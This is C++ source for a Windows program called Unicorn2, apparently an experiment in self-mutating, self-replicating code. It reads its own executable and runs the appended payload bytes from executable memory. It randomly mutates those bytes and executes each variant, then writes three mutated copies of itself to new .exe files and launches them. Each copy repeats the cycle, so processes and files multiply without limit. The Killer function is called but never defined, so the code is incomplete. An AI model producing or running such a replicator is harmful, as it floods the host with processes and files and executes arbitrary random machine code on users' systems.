// Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include<stdio.h>
#include<Windows.h>
#include<sys\timeb.h> 

int NextPayloadSize = 32768;
#define NextNum 3
#define GapTime 4096

int myEXESize = 0;
int myStaticLength = 0;
int myPayloadLength = 0;
UINT8* myFileBuffer = 0;
UINT8* executeableMem = 0;
UINT8* nextPayloadBuf = 0;

char nextEXEName[256] = { 0 };

struct timeb AccuTime;

void GenNxtPayload();
void MuNxtPayload();

void Killer(void);

int main(int argc, char** argv)
{
    //printf("0x%x", myTestcode[0]);
    ftime(&AccuTime);
    srand((unsigned)AccuTime.time);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp);
    fp = NULL;
    for (int i = 0; i < myEXESize - 3; i++)
        if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
        {
            printf("Found Payload Start @ 0x%X\n", i);
            myStaticLength = i;
            executeableMem = myFileBuffer + myStaticLength + 1;
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(executeableMem), 0, 0, 0);
            break;
        }
    if (myStaticLength == 0) // This is the Soozoo version!
    {
        myStaticLength = myEXESize;
        nextPayloadBuf = (UINT8*)VirtualAlloc(0, NextPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        nextPayloadBuf[0] = 0x23;
        for (int i = 1; i < NextPayloadSize - 1; i++)
        {
            nextPayloadBuf[i] = 0x90; // NOP
        }
        nextPayloadBuf[NextPayloadSize - 1] = 0xC3; // RET
    }
    else
    {
        nextPayloadBuf = myFileBuffer + myStaticLength;
        NextPayloadSize = myEXESize - myStaticLength;
    }

    for (int i = 0; i < NextNum; i++)
    {
        MuNxtPayload();
        while (fp == NULL)
        {
            sprintf(nextEXEName, "Unicorn2-0x%X%X.exe", rand(), rand());
            fp = fopen(nextEXEName, "wb");
        }
        fwrite(myFileBuffer, 1, myStaticLength, fp);
        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
        fclose(fp);
        fp = NULL;
        
        Sleep(GapTime); // Order is important here to avoid producing so fast
        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
        Killer();
    }
}

void MuNxtPayload()
{
    int MuPos = 0;
    UINT8 bakupData = 0;
    while(1)
    {
        printf("Finding Liveable Mutation Position...\n");
        MuPos = rand() % (NextPayloadSize - 5) + 4; // Keep first 4 bytes and last 1 byte
        bakupData = nextPayloadBuf[MuPos];
        nextPayloadBuf[MuPos] = rand() % 256;
        __try
        {
            ((void(*)())(nextPayloadBuf + 1))();
            printf("Mutation Success @ 0x%X\n", MuPos);
            break;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            printf("Mutation Failed @ 0x%X, revert data\n", MuPos);
            nextPayloadBuf[MuPos] = bakupData;
        }
    }
}

void GenNxtPayload()
{
    //ftime(&AccuTime);
    //srand((unsigned)AccuTime.time);
    nextPayloadBuf[0] = 0x90;
    nextPayloadBuf[1] = 0x90;
    nextPayloadBuf[2] = 0x90;
    for (int i = 3; i < NextPayloadSize - 1; i++)
    {
        nextPayloadBuf[i] = rand() % 256;
    }
    nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
}